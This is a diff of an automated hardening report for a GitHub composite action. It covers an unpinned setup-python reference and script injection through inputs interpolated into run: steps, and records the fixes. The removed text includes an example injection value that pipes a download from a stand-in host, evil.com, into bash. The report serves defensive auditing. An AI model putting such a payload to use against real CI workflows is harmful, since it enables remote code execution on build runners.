@@ -8,7 +8,7 @@
 
 **Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`
 
-**Harden Agent Version:** `1`
+**Harden Agent Version:** `2`
 
 Action **rmeneely--update-yaml/v1** was hardened automatically. 6 finding(s) were identified and resolved across 1 iteration(s).
 
@@ -16,20 +16,24 @@ Action **rmeneely--update-yaml/v1** was hardened automatically. 6 finding(s) wer
 
 ### unpinned-uses (severity: high)
 
-The composite action uses `actions/setup-python@v4`, which is pinned to a mutable version tag rather than an immutable 40-character commit SHA. A tag can be moved to point to a different (potentially malicious) commit, enabling a supply-chain attack. It should be pinned to a full SHA, e.g. `actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v4`.
-
-Locations:
-
-- `action.yml:21`
-
-### script-injection (severity: high)
-
-Sub-rule (a): Multiple `${{ ... }}` expressions are interpolated directly inside `run:` shell command strings, allowing script injection. In the first run step, `${{ inputs.infile }}`, `${{ inputs.varlist }}`, and `${{ github.action_path }}` are embedded directly in the shell command: `python ${{ github.action_path }}/update-yaml.py -i ${{ inputs.infile }} -V "${{ inputs.varlist }}" > ${{ github.action_path }}/.update-yaml.tmp`. An attacker-controlled `inputs.infile` value such as `; curl http://evil.com | bash ;` would be executed as shell code. In the second run step, `${{ inputs.infile }}` and `${{ github.action_path }}` are again interpolated directly: `diff ${{ inputs.infile }} ${{ github.action_path }}/.update-yaml.tmp` and `mv ${{ github.action_path }}/.update-yaml.tmp ${{ inputs.infile }}`. All these expressions must be moved to `env:` variables and then referenced as double-quoted shell variables (e.g., `"$INPUT_INFILE"`).
+The composite action uses `actions/setup-python@v4`, which is pinned to a mutable version tag rather than an immutable 40-character commit SHA. This means the action could silently change if the tag is moved, enabling supply-chain attacks. It should be pinned to a full SHA, e.g. `actions/setup-python@<40-char-sha> # v4`.
 
 Locations:
 
 - `action.yml:23`
+
+### script-injection (severity: high)
+
+Rule (a): Multiple `${{ ... }}` expressions are interpolated directly inside `run:` shell command strings, bypassing shell quoting and allowing script injection.
+
+Step 1 (line 25): `python ${{ github.action_path }}/update-yaml.py -i ${{ inputs.infile }} -V "${{ inputs.varlist }}" > ${{ github.action_path }}/.update-yaml.tmp` — `inputs.infile` and `inputs.varlist` are attacker-controlled inputs injected directly into the shell command. A value like `; malicious-command #` in `inputs.infile` would execute arbitrary code.
+
+Step 2 (line 27): `updated=$((diff ${{ inputs.infile }} ${{ github.action_path }}/.update-yaml.tmp || true) | wc -l ...)` and `mv ${{ github.action_path }}/.update-yaml.tmp ${{ inputs.infile }}` — again `inputs.infile` is interpolated directly into the shell, enabling injection. All `${{ ... }}` values must be moved to `env:` variables and then double-quoted in the shell script.
+
+Locations:
+
 - `action.yml:25`
+- `action.yml:27`
 
 ### static-inline-injection (severity: high)
 
@@ -71,5 +75,7 @@ Locations:
 
 **Notes:**
 
-Fixed action.yml: (1) Pinned actions/setup-python@v4 to full SHA 7f4fc3e22c37d6ff65e88745f38bd3157c663f7c with # v4 comment. (2) Moved all ${{ inputs.infile }}, ${{ inputs.varlist }}, and ${{ github.action_path }} expressions from both run: blocks into env: maps (ACTION_PATH, INPUT_INFILE, INPUT_VARLIST), then referenced them as double-quoted shell variables in the shell scripts to prevent script injection.
+Fixed all findings in hardened/action/action.yml:
+1. unpinned-uses: Pinned `actions/setup-python@v4` to full SHA `7f4fc3e22c37d6ff65e88745f38bd3157c663f7c` with `# v4` comment.
+2. script-injection / static-inline-injection (lines 25, 27, 28, 30): Moved all `${{ github.action_path }}`, `${{ inputs.infile }}`, and `${{ inputs.varlist }}` expressions out of `run:` shell strings and into `env:` blocks as `ACTION_PATH`, `INFILE`, and `VARLIST` respectively. All shell references are now properly double-quoted to prevent word splitting and injection attacks.
 
